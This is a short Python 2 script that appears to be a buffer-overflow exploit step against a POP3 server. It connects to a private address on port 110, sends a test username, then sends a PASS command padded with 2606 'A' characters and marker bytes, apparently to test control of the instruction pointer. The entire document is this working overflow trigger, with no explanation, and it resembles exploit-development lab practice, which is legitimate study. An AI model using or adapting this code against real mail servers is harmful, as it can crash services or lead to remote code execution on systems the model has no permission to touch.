#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "A"*2606 +"B"+'4'+"C"*20
try:
    print "\n Sending evil %s bytes buffer..." % len(buffer)
    s.connect(("10.1.131.75",110))
    data = s.recv(1024)
    s.send("USER test" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer +"\r\n")
    print "\nDone!"
except:
    print "Could not connect to POP3"
